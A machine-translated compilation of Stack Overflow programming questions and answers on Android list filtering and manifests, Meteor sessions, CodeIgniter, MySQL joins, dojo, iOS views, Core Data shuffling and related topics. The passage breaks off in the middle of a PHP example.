在您的列表中实施过滤器

```
 public void setData(ArrayList mPpst) {   
         set data either searched data or original values from database
        mPostingData = mPpst;//contains class items data.
    }

 @Override
 public Filter getFilter() {
     return new Filter() {
         @Override
         protected void publishResults(CharSequence constraint, FilterResults results) {
             if (results != null && results.count >= 0) {
                 setData( results.values);//if results match set data
             } else {
                 setData(mOri);// set data for listview original values.
             }

             notifyDataSetInvalidated();
         }

        @Override
         protected FilterResults performFiltering(CharSequence constraint) {
             FilterResults result = new FilterResults();
             if (!TextUtils.isEmpty(constraint)) {
                   ArrayList foundItems = new ArrayList();
                 constraint = constraint.toString().toLowerCase();
                 if(listitems!=null)
                 {
                         if(listitems.equals(constarint))//matching
                         foundItems.add(listitems);

                     }
                     else
                     {

                     }
                 }
                 }
                 result.count = foundItems.size();//search results found return count
                 result.values = foundItems;// return values
             } 
             else
             {
                 result.count=-1;// no search results found
             }

             return result;
         }
     };
 } 
```

编辑 1

[如何在列表视图中设置 json 解析数据，然后在其中添加搜索功能](https://stackoverflow.com/questions/15109406/how-to-set-json-parsed-data-in-a-listview-and-then-adding-search-functionality-i/15109592#15109592)。链接中的答案有效。我使用了临时数据并对其进行了搜索。您可以显示数据表单数据库并对其进行修改。

编辑2：

```
 public class MainActivity extends Activity {

// List view
private ListView lv;

// Listview Adapter
ArrayAdapter<String> adapter;

// Search EditText
EditText inputSearch;

// ArrayList for Listview
ArrayList<HashMap<String, String>> productList;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Listview Data
    String products[] = {"aaa","bbbb","cccc","dddd"};

    lv = (ListView) findViewById(R.id.list_view);
    inputSearch = (EditText) findViewById(R.id.inputSearch);

    // Adding items to listview
    adapter = new ArrayAdapter<String>(this, R.layout.list_item, R.id.product_name, products);
    lv.setAdapter(adapter);

    /**
     * Enabling Search Filter
     * */
    inputSearch.addTextChangedListener(new TextWatcher() {

        @Override
        public void onTextChanged(CharSequence cs, int arg1, int arg2, int arg3) {
            // When user changed the Text
            MainActivity.this.adapter.getFilter().filter(cs);   
        }

        @Override
        public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
                int arg3) {
            // TODO Auto-generated method stub

        }

        @Override
        public void afterTextChanged(Editable arg0) {
            // TODO Auto-generated method stub                          
        }
    });
  }

} 
```

编辑 3 使用数据库中的数据进行搜索

```
 public class SearchActivity extends ListActivity {
 ArrayAdapter<String> dataAdapter = null;

  private ArrayList<String> results = new ArrayList<String>();
  private String tableName = DatabaseHandler.TABLE_SEARCH;
  private SQLiteDatabase newDB;
  ArrayAdapter<String> adapter = null;

  @Override
  public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.page_search);

   DatabaseHandler dbHelper = new DatabaseHandler(this.getApplicationContext());
   newDB = dbHelper.getWritableDatabase();
   Cursor c = newDB.rawQuery("SELECT skeys FROM " +
        tableName, null);
   if (c != null ) {
    if  (c.moveToFirst()) {
        do {
            String skeys = c.getString(c.getColumnIndex("skeys"));
            results.add(skeys);
        }while (c.moveToNext());
    } 
 }           

dataAdapter = new ArrayAdapter<String>(this,
        R.layout.listviews_search, results);

setListAdapter(new ArrayAdapter<String>(this,
        R.layout.listviews_search, results));

  ListView listView = (ListView) findViewById(android.R.id.list);
  listView.setAdapter(dataAdapter);
  listView.setTextFilterEnabled(true);

  listView.setOnItemClickListener(new OnItemClickListener() {
      public void onItemClick(AdapterView<?> parent, View view,
              int position, long id) {
          Toast.makeText(getApplicationContext(),
                  ((TextView) view).getText(), Toast.LENGTH_SHORT).show();
      }
  });

  EditText myFilter = (EditText) findViewById(R.id.search);
  myFilter.addTextChangedListener(new TextWatcher(){
      public void afterTextChanged(Editable s) {
  }

      public void beforeTextChanged(CharSequence s, int start, int count, int after) {
  }

      public void onTextChanged(CharSequence s, int start, int before, int count) {
   dataAdapter.getFilter().filter(s.toString());
      }
  });
 }
} 
```

# meteor - 读取会话变量而不使上下文无效

> ID：15357868
> 
> 赞同：2
> 
> 时间：2013-03-12T09:47:58.900
> 
> 标签：meteor

有没有办法从 Session 变量中读取而无需在模板更改时重新呈现模板？

场景：

我使用 jQuery 动态更改元素的样式，但是当创建新元素时，我想设置其默认样式（我知道在呈现元素时我可以调用相同的 jQuery 命令）

**例子：**

```
<template name="image">
    <!-- How can I avoid -height- being reactive -->
    <img src="img.jpg" style="height: {{height}}">
</template>

Templates.image.height = function() {
    return Session.get("height");
};

Templates.controls.events = {
    'click #btn': function() {
        // Change the height of all exiting images
        $("img").css({height: Session.get("height")});
    }
}; 
```

我希望添加的每个新图像都将高度存储在会话变量中，而无需重新渲染`img`. 我能想到的所有解决方案都感觉像是 hack。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T07:00:06.220

Session 将其值存储在 中`Session.keys`，但它们是序列化的。要反序列化它们，您可以使用[https://github.com/meteor/meteor/blob/master/packages/session/session.js](https://github.com/meteor/meteor/blob/master/packages/session/session.js)`parse`中的函数：

```
var parse = function (serialized) {
  if (serialized === undefined || serialized === 'undefined')
    return undefined;
  return EJSON.parse(serialized);
}; 
```

然后，代替`Session.get('key-name')`，做： `parse(Session.keys['key-name'])`。这应该与`Session.get`不使任何上下文无效的情况相同。将所有这些放在一起，这是一种似乎有效的方法：

```
Session._parse = function (serialized) {
  if (serialized === undefined || serialized === 'undefined')
    return undefined;
  return EJSON.parse(serialized);
};

Session.getNonReactive = function (key) {
  var self = this;
  return self._parse(self.keys[key]);
}; 
```

**2013 年 3 月 13 日更新**：Meteor 刚刚发布了 v0.5.8，并附带了一个新功能。这是执行此操作的新方法：

```
Session.getNonReactive = function (key) {
  return Deps.nonreactive(function () { return Session.get(key); });
}; 
```

**更新 15/2/2016** Meter 目前已被弃用，但它仍然有效。改用`Tracker`：

```
Session.getNonReactive = function (key) {
  return Tracker.nonreactive(function () { return Session.get(key); });
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T10:13:13.973

您可以使用保留：[​​http://docs.meteor.com/#template_preserve](http://docs.meteor.com/#template_preserve)

为什么不只使用 jquery 或把手来处理值，为什么两者都使用？具有一致性，因此您可以更好地管理您的代码。

如果您发布一些代码，我可以帮助您举个例子

**使用您的代码**编辑该示例****

 **您的代码仅使用车把：

```
<template name="image">
    <!-- How can I avoid -height- being reactive -->
    {{#isolate}
    <img src="img.jpg" style="height:{{height}}">
    {{/isolate}}
</template>

Template.image.height = function() {
    return Session.get("height") || "0px"; //Default height is no session defined
};

Template.controls.events = {
    'click #btn': function() {
        //What does this do exactly?
        //$("img").css({height: Session.get("height")});

        Session.set("height","40px");
    }
}; 
```

为了防止您的整个模板被重新渲染，请将您的反应变量`{{height}}`放在`{{#isolate}}`. 请参阅反应性隔离：[http ://docs.meteor.com/#isolate](http://docs.meteor.com/#isolate)**

# php - Codeigniter delete function not working

> ID：15357873
> 
> 赞同：-1
> 
> 时间：2013-03-12T09:48:26.037
> 
> 标签：php, codeigniter

I am trying to build a simple delete function in my project to delete data from a table. I .can't figure out why it is not working. I used the codeigniter user guide to help me out with this. I am getting an error and don't know why. Here is my controller, model and view for the delete:

> A PHP Error was encountered
> 
> Severity: Notice
> 
> Message: Undefined property: stdClass::$id

**Model**

```
function delete()
{
    $this->load->database();
    $tables = array('info', 'info2');
    $this->db->where('id', 1);
    $this->db->delete($tables);

} 
```

**controller**

```
 function del($tables){

if((int)$tables > 0){
          $this->info_model->delete($tables);
}

$data = $this->info_model->delete();
$data['query'] = $this->result_model->delete();

$this->load->view('info_view',$data);    
 } 
```

**view**

```
//this line gives me the error

 <td><?php echo anchor('info_controller/del' . $row->id,'Delete')?> </td> 
```

**EDIT**

I used this tutorial to make this

```
http://www.phpeveryday.com/articles/CodeIgniter-Form-Centralizing-$data-P291.html 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:39:39.577

In your controller Load your model like this

```
$this->load->model('deletion_model'); 
```

Then call the method of the deletion_model

```
$this->deletion_model->delete($id); 
```

Make sure you load the model.

after that i suggest you pass value of id as string.

```
$this->db->where('id', '1'); 
```

OR

use the variable supplied to this function if you are not using static values

```
$this->db->where('id', $id); 
```

Please read the guide properly

[http://ellislab.com/codeigniter/user-guide/database/active_record.html#delete](http://ellislab.com/codeigniter/user-guide/database/active_record.html#delete)

You can also retrieve the id of the record for deletion by using

```
$id=$this->uri->segment(3); // depending on which segment the id is 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-12T10:36:48.237

1.  I do not see any `$row` object in your controller, although you use it in your view: `$row->id`
2.  Your model is not returning anything.
3.  If you delete a specified row, `$object->id` will cease to exist.
4.  The link in your view it states that you want to show a delete link, but you use that view in the controller that deals with the actual delete action.

Edit: Because you try to iterate in your view through query results, `$data['query']` from your controller should point to a select statement.

# android - 从另一个应用程序获取一个 Android 应用程序的内存使用情况

> ID：15357875
> 
> 赞同：1
> 
> 时间：2013-03-12T09:48:33.137
> 
> 标签：android, memory

我正在开发一个 Android 应用程序，以每秒获取另一个 android 应用程序的内存使用情况。

我启动一个后台服务，然后使用它的包名运行其他应用程序。然后我获取该应用程序的 PID，并获取`proc/<pid>/smaps`OR `proc/<pid>/stat`OR`proc/<pid>/statm`文件以获取内存使用情况。

有人可以指导我如何从该文件或任何其他方法中获取内存使用情况吗？

# php - MySQL - 具有多对多关系的 INNER JOIN 查询

> ID：15357877
> 
> 赞同：3
> 
> 时间：2013-03-12T09:48:44.180
> 
> 标签：php, mysql, sql, select

我试图弄清楚如何使用 JOIN，但是我被困在某个地方。

我有两张桌子：

```
Post (postid,title) with values (1,'a'), (2,'b'),(3,'c'),(4,'d'),...
Filter (postid,reader) values (1,3),(1,2),(1,6),(1,10),(2,1),... 
```

我正在尝试这个查询：

```
SELECT post.title
FROM post
INNER JOIN filter ON filter.reader ='2'
LIMIT 0 , 10 
```

我想要的是来自表格帖子的所有标题，其中 id（在本例中为 2）与表格过滤器中的阅读器匹配。

查询有效，但我得到了重复，所以我在某处遗漏了一个关键点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:50:25.707

您获得多个结果的原因是您的查询从两个表中生成笛卡尔积，因为您没有指定应如何连接表。

```
SELECT post.title
FROM   post
       INNER JOIN filter 
           ON filter.postID = post.postID // tells how are tables be joined
WHERE  filter.reader = '2'
LIMIT 0 , 10 
```

要进一步了解有关联接的更多信息，请访问以下链接：

*   [SQL 连接的可视化表示](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:54:56.393

```
SELECT post.title
FROM post
JOIN filter USING (postid)
WHERE filter.reader ='2'
LIMIT 10 
```

您加入的条件是`filter.reader = '2'`，这相当于在`WHERE`子句中包含它。这意味着您正在执行所有`post` *和* `filter`行的交叉连接（交叉产品），然后在 上过滤这些结果`filter = '2'`，这将导致许多帖子的帖子 ID 不匹配。您需要添加 Post 和 Filter postid 匹配的附加条件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:57:34.057

你也可以这样做

```
"select post.*,filter.* from post, filter where filter.postID=post.postID  and filter.reader='2' limit 0,10" 
```

希望这可以帮助

# dojo - dojo 1.8 - 每次选择更改时都无法更新 ComboBox

> ID：15357879
> 
> 赞同：0
> 
> 时间：2013-03-12T09:48:47.293
> 
> 标签：dojo

嗨，我有一个选择（3 个选项）和一个组合框，每次选择更改时都会使用新选项进行更新。但是，每次更改选择时，我都无法更新或刷新 ComboBox。它仅在页面刷新时才有效。

```
meter_Select.on('change', function()
{
console.debug("selected -> " + meter_Select.value);
switch(meter_Select.value)
{
case 'testdata1970_05': var memoStore2 =  new Memory({data:response2});
break;
case 'testdata1970_10': var memoStore2 =  new Memory({data:response3});
break;
case 'testdata2060_03': var memoStore2 =  new Memory({data:response1});
}

var combx = new ComboBox({
store: memoStore2,
    searchAttr: "mfg_code"
    }, "node_cardSelect");
    combx.startup(); 
```

更进一步，您可以在 jsfiddle 结帐 - [http://jsfiddle.net/clementyap/9tNhN/6/](http://jsfiddle.net/clementyap/9tNhN/6/) 请告知。感谢您的帮助，并提前感谢克莱门特

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T12:29:08.710

如果您查看浏览器 JavaScript 控制台，您会看到如下内容：

> 未捕获的错误：尝试使用 id==node_cardSelect 注册小部件，但该 id 已注册

那是因为您每次都尝试使用相同的 ID 重新创建 ComboBox。如果 ComboBox 已经存在，您可以更新商店并再次调用启动，或者直接销毁它并创建一个新的。

```
 var combx = registry.byId("node_cardSelect");
        if(combx) {
            combx.store = memoStore2;
        }
        else {
            combx = new ComboBox({
                store: memoStore2,
                searchAttr: "mfg_code"
            }, "node_cardSelect");
        }

        combx.startup(); 
```

这是一个更新的 jsfiddle 上面的修复：http: [//jsfiddle.net/nhnDr/1/](http://jsfiddle.net/nhnDr/1/)

# zen-cart - 更改zencart的页面内容和标题

> ID：15357880
> 
> 赞同：0
> 
> 时间：2013-03-12T09:48:52.027
> 
> 标签：zen-cart

我已经安装了一个页脚菜单模型。现在我有一个默认页面“第 2 页”。我也想更改页面和标题。如何更改页面内容。

我已经尝试过如下。

转到管理 - 工具 - Ez-pages - 第 2 页

但是没有名为 Page 2 的页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-07T00:09:56.570

我整理了一系列关于如何在 Zen Cart 中修改这些定义页面的教程：

[http://www.kerrinhardy.com/2010/01/12/more-information-zen-cart-sidebox/](http://www.kerrinhardy.com/2010/01/12/more-information-zen-cart-sidebox/)

相关教程有：

*   在更多信息侧框中更新第 2 页、第 3 页或第 4 页的页面标题
*   在更多信息侧框中编辑第 2 页、第 3 页或第 4 页的内容
*   在更多信息侧框中编辑第 2 页、第 3 页或第 4 页的链接名称
*   在更多信息侧框中更新第 2 页、第 3 页或第 4 页的页面标题

但是，如果页脚插件没有使用 Zen Cart 功能并且实际上已经硬编码了“第 2 页”链接，则您需要在页脚插件模板文件中对其进行修改。

希望这可以帮助。

# jquery-mobile - 动态禁用按钮

> ID：15357885
> 
> 赞同：2
> 
> 时间：2013-03-12T09:49:02.897
> 
> 标签：jquery-mobile, ios6, cordova

我正在为 iOS 应用程序使用 JqueryMobile-1.3.0 和 cordova-2.1.0。我想禁用 pageshow 事件上的按钮。我正在这样做`$('#clearButton').attr('disabled', "")`，按钮是 `<input type='button' data-role="button" data-inline="true" id="clearButton" value="Clear" onclick='resetLogin();'/>`

它禁用了按钮 onclick 事件，但按钮的样式保持不变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:52:57.360

您可以调用按钮小部件的[disable()方法：](http://api.jquerymobile.com/button/#method-disable)

```
$("#clearButton").button("disable"); 
```

这样，元素将被禁用，小部件将正确反映该状态。您可以稍后调用其[enable()](http://api.jquerymobile.com/button/#method-enable)方法来重新启用该按钮。

# iphone - 相同的偏移值在 LandscapeLeft 和 LandscapeRight 中以不同的方式移动 UIView。为什么？

> ID：15357887
> 
> 赞同：0
> 
> 时间：2013-03-12T09:49:11.840
> 
> 标签：iphone, xcode, uiview, uiinterfaceorientation, landscape-portrait

我有 UIView - UIScrollView - UITextField

如果出现键盘（textField 委托），我将 self.view 向上移动一些偏移值。但是，相同的值如何在 LandscapeLeft 和 LandscapeRight 中产生不同的偏移量？在 LandscapeLeft 中，它工作正常（底部图片）。似乎有 20px 的差异（与 statusBar 高度重合？）

如何解决？（不接受硬编码+20作为答案）感谢您的帮助。

```
// AHTextFieldHelper.m
...
- (void)moveViewUp:(UIView *)view withOffset:(int)offset forOrientation:(Orientation)orientation withDuration:(float)animationDuration
{
    _animationDuration = animationDuration;
    _view = view;
    _offset = offset;
    _orientation = orientation;

    [UIView animateWithDuration:animationDuration delay:0 options:UIViewAnimationOptionCurveEaseOut animations:^{

        if (orientation == portrait)
        {
            _tempPortraitRect = view.frame;
            view.frame = CGRectOffset(view.frame, view.frame.origin.x, view.frame.origin.y - offset);
        }
        else if (orientation == landscapeLeft)
        {
            _tempLandscapeLeftRect = view.frame;
            view.frame = CGRectOffset(view.frame, view.frame.origin.x + offset, view.frame.origin.y);
        }
        else if (orientation == landscapeRight)
        {
            _tempLandscapeRightRect = view.frame;
            view.frame = CGRectOffset(view.frame, view.frame.origin.x - offset, view.frame.origin.y);
        }
    } completion:^(BOOL finished){
        _isUP = YES;
    }];
} 
```

ViewController.m - (void)textFieldDidBeginEditing:(UITextField *)textField

```
// ViewController.m - (void)textFieldDidBeginEditing:(UITextField *)textField
// some refactoring needed

if ([[UIDevice currentDevice] orientation] == UIDeviceOrientationLandscapeRight)
{
    _originalLandscapeRightFrame = self.view.frame;
    CGPoint translatedTextFieldOrigin = [[textField superview] convertPoint:textField.frame.origin toView:self.view];

    if (fabs(translatedTextFieldOrigin.y) >= ([RSHelpersFunctions screenResolution].width - kAHiPhoneLandscapeKeyboardHeight) - textField.frame.size.height)
    {
        CGFloat newPoint = (translatedTextFieldOrigin.y - ([RSHelpersFunctions screenResolution].width - kAHiPhoneLandscapeKeyboardHeight)) + textField.frame.size.height + 30 + 20; // quick fix
         _textFieldHelper = [AHTextFieldHelper new];
        [_textFieldHelper moveViewUp:self.view withOffset:fabs(newPoint) forOrientation:landscapeRight withDuration:0.5];
    }
}
else if ([[UIDevice currentDevice] orientation] == UIDeviceOrientationLandscapeLeft)
{
    _originalLandscapeLeftFrame = self.view.frame;
    CGPoint translatedTextFieldOrigin = [[textField superview] convertPoint:textField.frame.origin toView:self.view];

if (fabs(translatedTextFieldOrigin.y) >= ([RSHelpersFunctions screenResolution].width - kAHiPhoneLandscapeKeyboardHeight) - textField.frame.size.height)
{
    CGFloat newPoint = (translatedTextFieldOrigin.y - ([RSHelpersFunctions screenResolution].width - kAHiPhoneLandscapeKeyboardHeight)) + textField.frame.size.height + 30;
    _textFieldHelper = [AHTextFieldHelper new];
    [_textFieldHelper moveViewUp:self.view withOffset:fabs(newPoint) forOrientation:landscapeLeft withDuration:0.5];
}
} 
```

![在此处输入图像描述](../Images/fc2f768addafcd68906d0c79e4c7f3ac.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T13:12:21.087

视图层次结构中的顶级 UIView 的**框架**未针对设备的方向进行调整。您可能会更幸运地尝试使用顶级视图的**边界（针对方向***进行*了调整）。

要查看实际情况，请尝试查看以下生成的输出：

```
NSLog(@"self.view.frame = %@", NSStringFromCGRect(self.view.frame));
NSLog(@"self.view.bounds = %@", NSStringFromCGRect(self.view.bounds)); 
```

您可能会看到框架与边界的宽度和高度被“交换”。

另一种策略是将 UIView 嵌套在您的顶级视图中，并设置正确的自动调整大小/支柱，然后使用嵌套视图的框架而不是顶级框架。

# objective-c - 洗牌来自 NSFetchedResultsController 的结果

> ID：15357888
> 
> 赞同：0
> 
> 时间：2013-03-12T09:49:18.043
> 
> 标签：objective-c, core-data, random, nsarray, nsfetchedresultscontroller

我正在使用一个`NSFetchedResultsController`从核心数据结构中提取几千个结果并将它们显示在`UITableView`. 我有一些可用的选项可以使用谓词执行提取并显示更新的数据，例如按关键字搜索、按作者排序等。

我想在显示之前随机洗牌。我已经创建了一个类别，`NSArray`其中包含一个`shuffle`可以完美运行的方法，但是调用该方法`[self.fetchedResultsController fetchedObjects]`没有任何效果，数据保持不变。我假设这是因为`fetchedObjects`is `readonly`，并且我需要制作一份副本。

我已经制作了那个副本，但我遇到的问题是使新阵列与阵列和平共存`fetchedObjects`。我可以转到各种详细视图并修改内容，因此我试图确定如何保持`fetchedObjects`和我的`shuffledFetchedObjects`数组同步，即使它们的内容顺序不同。

这是我的简单小`shuffle`类别：

```
- (NSArray *) shuffle {
    NSMutableArray *tmp = [NSMutableArray arrayWithArray: self];
    for (int i = [tmp count] - 1; i > 0; i--) [tmp exchangeObjectAtIndex: arc4random() % (i + 1) withObjectAtIndex: i];
    return [NSArray arrayWithArray: tmp];
} 
```

我有什么选择来实现这一目标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:56:37.277

无法修改`fetchedObjects`获取的结果控制器 (FRC)。您可以使用随机*索引*将 FRC 行号映射到表视图行号，反之亦然，而不是对获取的对象进行混洗。

但是如果你真的不需要 FRC 的变化跟踪功能，那么做一个简单的 fetch 会更容易：

```
NSArray *results = [context executeFetch:request error:&error]; 
```

洗牌结果：

```
NSArray *shuffledResults = [results shuffle]; 
```

并`shuffledResults`在数据源方法`numberOfRows...`和`cellForRow...`. 然后，您不必保持任何同步。

*更新：*如果你有部分，那么你需要 FRC 和一个数组数组（1\. level 是节号，2\. level 是行号）用于洗牌对象。你可以这样填写：

```
// ... after [frc performFetch:&error] ...
self.dataSource = [NSMutableArray array]; // a NSMutableArray property of your view controller
for (NSUInteger section = 0; section < [[frc sections] count]; section++) {
    NSArray *objects = [[frc sections][section] objects]; // all objects of this section
    [self.dataSource addObject:[objects shuffle]];
} 
```

然后，在 中`cellForRowAtIndexPath`，您可以像这样访问数组：

```
NSManagedObject *obj = self.dataSource[indexPath.section][indexPath.row]; 
```

（一种完全不同的方法是向实体添加属性“randomOrder”，为每个对象分配随机数，并将“randomOrder”的排序描述符添加到获取请求。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T12:28:12.387

我已经设法通过使用`shouldShowShuffled`布尔值解决了这个问题，我根据选择的过滤器打开和关闭它。如果它变成`ON`，我会显示我的 FRC 结果副本中的结果，这些结果被打乱了。如果它已打开`OFF`，我会`fetchedObjects`直接从 FRC 显示。

我`fetchedObjects`会在数组更新的任何时候更新洗牌数组，所以它总是最新的。

# android - 是否有库可以访问 Android 或 Apple 商店中的应用程序

> ID：15357892
> 
> 赞同：1
> 
> 时间：2013-03-12T09:49:21.013
> 
> 标签：android, ruby-on-rails

是否有可用于访问 Android 或 Apple 商店中的应用程序的 ruby​​ gem。我们想使用关键字搜索某个类别下的应用程序列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T11:56:20.160

Android Market API 包装器 Gem

[https://github.com/jberkel/supermarket](https://github.com/jberkel/supermarket)

（嗯，这似乎被放弃了。还有

[https://github.com/bearstouch/android_market_api](https://github.com/bearstouch/android_market_api)

和

[https://github.com/chadrem/market_bot](https://github.com/chadrem/market_bot)）

不过，我不相信 Apple App Store 会公开 API。

# android - 应用程序图标在 android 设备上不可见

> ID：15357893
> 
> 赞同：3
> 
> 时间：2013-03-12T09:49:22.773
> 
> 标签：android, android-manifest

我正在开发一款安卓游戏。

它工作正常，但我有一个问题，如果我从我`android manifest`的应用程序图标中删除下面的行是可见的。如果我不删除这些行，那么我的应用程序图标在我的 android 上不可见。

```
 <data android:host="mocha" android:path="/RTT/reset"
  android:scheme="content" /> 
```

这是我的原始 android 清单，其中图标不可见：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="ihpc.mocha.rtt"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="12" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_LOGS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <application
        android:name="com.game.rtt.RttGame"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:largeHeap="true"
        android:theme="@android:style/Theme.NoTitleBar" >
        <activity
            android:screenOrientation="sensorLandscape"
            android:name=".MainScene"
            android:label="@string/title_activity_main_scene" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />

                 <!-- remove below lines to visible the icon start!!!-->
            <data
                android:host="mocha"
                android:path="/RTT/reset"
                android:scheme="content" />
             <!-- remove below lines to visible the icon end!!!-->
            </intent-filter>

        </activity>

      <activity
            android:name=".SessionTimeOutActivity"
            android:label="@string/app_name" 
            android:screenOrientation="reverseLandscape">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />

                <category android:name="android.intent.category.DEFAULT" />

                <data
                    android:host="mocha"
                    android:path="/RTT/sessionTimeOut"
                    android:scheme="content" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

请告诉我同样的原因？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-12T10:04:24.477

从[“使用意图匹配”](http://developer.android.com/guide/components/intents-filters.html#imatch)开始：

*“意图与意图过滤器相匹配，不仅可以发现要激活的目标组件，还可以发现有关设备上组件集的某些信息。例如，Android 系统填充应用程序启动器，即显示可供用户启动的应用程序，通过查找所有带有指定“android.intent.action.MAIN”动作和“android.intent.category.LAUNCHER”类别的意图过滤器的活动（如上一节所示） . 然后它在启动器中显示这些活动的图标和标签。类似地，它通过在其过滤器中查找具有“android.intent.category.HOME”的活动来发现主屏幕。”*

应用程序启动器无法识别您的启动器活动，因为您假设您的活动有一些数据。请在您请求数据的地方添加一个新的意图过滤器。

例子：

```
 <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
        <intent-filter>
            <action android:name="android.intent.action.SEND"/>
            <category android:name="android.intent.category.DEFAULT" />
            <data android:mimeType="application/json"/>
        </intent-filter> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T10:08:30.327

它也发生在我身上。您可以修复它，将数据标签添加到另一个意图过滤器中，如下所示：

```
 <activity
        android:screenOrientation="sensorLandscape"
        android:name=".MainScene"
        android:label="@string/title_activity_main_scene" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />

            </intent-filter>
        <intent-filter>
          <data
            android:host="mocha"
            android:path="/RTT/reset"
            android:scheme="content" />
         <!-- remove below lines to visible the icon end!!!-->
        </intent-filter>

    </activity> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-11T13:15:37.023

我刚刚将这一行添加到清单中的启动器活动中，然后图标出现了：

```
<category android:name="android.intent.category.DEFAULT" /> 
```

它看起来像这样：

```
<activity
            android:name=".MainActivity"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
```

# ruby-on-rails - FacebookOmniauth登录后如何从URL中删除丑陋的字符

> ID：15357894
> 
> 赞同：0
> 
> 时间：2013-03-12T09:49:23.300
> 
> 标签：ruby-on-rails, facebook

我正在使用omniauth-facebook gem，效果很好。

但是当它在应用程序上加载回页面时，会将这些字符添加到 url：

```
/#_=_ 
```

我怎样才能阻止这种情况发生。

小白

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:56:06.413

试试这个：

```
<script type="text/javascript">
            if (window.location.hash == '#_=_')window.location.hash = ''; //this script removes the #_=_ from the url which is appended by facebook after login
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T23:40:16.980

试试这个：

```
<script type="text/javascript">
if(window.location.hash=="#_=_") window.location.href="http://yourdomain.com/";
</script> 
```

# c++ - 为自定义类重载 std::find

> ID：15357898
> 
> 赞同：0
> 
> 时间：2013-03-12T09:49:41.310
> 
> 标签：c++, find, overloading, stl-algorithm

那么`std::find`对象中的自定义类是否有可能/“好”重载？然后不重载相等运算符。假设一个容器存储（智能）指向它的实际数据的指针，我真的对数据布局或存储模式不感兴趣，我只想找到某个数据成员....

这是否合法，“道德”？如果说我有一个`std::vector<std::shared_ptr<myClass> >`- 或“甚至”用户定义的容器？还是我应该始终依赖`std::find_if`此类情况？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:51:22.803

惯用的解决方案是使用[std::find_if](http://en.cppreference.com/w/cpp/algorithm/find)并给它一个合适的谓词。

这将您必须编写和维护的代码保持在最低限度，并将您与特定容器类型分离。

# php - 根据用户选择动态添加表单元素

> ID：15357901
> 
> 赞同：0
> 
> 时间：2013-03-12T09:49:44.330
> 
> 标签：php, jquery, forms, dynamicform

再会..

我有一个问题是我的齿轮磨了一个星期，但我找不到完全符合我要求的解决方案。

我正在使用 php 构建一个应用程序，旨在让员工接受订单并将其提交给相应的部门（类似于购物车，但略有不同）。

提交订单并分配给部门是我整理的。我想到的是这样的：

1.  员工单击按钮以添加项目
2.  一个弹出窗口将显示项目菜单
3.  员工可以一次选择一个项目，一旦选择了该项目，它就会添加到订单项目中。

项目将从数据库中填充。

我遇到的问题是，对于某些项目，我需要有多个子项目的选项。例如，如果我有一个包含项目的促销包，我需要将促销项目添加到带有以下子项目的订单列表中。

以下链接与我想要的类似，我需要的是添加的表单元素的数量根据工作人员选择的项目而有所不同：

[http://www.daveismyname.com/demos/dynamic-form-elements-with-jquery/](http://www.daveismyname.com/demos/dynamic-form-elements-with-jquery/)

任何关于如何实现这一点的想法或指示都将受到高度赞赏。

编辑：代码已被删除，因为它进行了重大修订。完成后我会发布最终结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T11:21:36.307

当员工单击按钮添加项目时，您的脚本会触发 AJAX 调用，该调用从 PHP 脚本中获取有关项目的数据。该数据应包含每个产品的子项数量。因此，当员工挑选商品时，您会使用商品和子商品填充订单。

关键是使用 AJAX 来获取数据，我假设现在您在页面加载时生成项目菜单，并在“添加项目”单击时更改 css 规则来显示它。如果您将其更改为 AJAX，您将拥有有关子项的数据，因此可以正确填充订单。

更新：

用户单击“添加项目”链接。AJAX 请求被触发，php 脚本返回 JSON 数组，其中包含有关可用项目的数据。该数组包含所有详细信息，包括依赖项（子项，当您选择主项时需要添加到订单中）。示例 php 脚本：

```
$list_of_items[] = array(
    'name' => 'Promo pack',
    'image' => '/images/promopack.jpg',
    'subitems' => array(
        array(
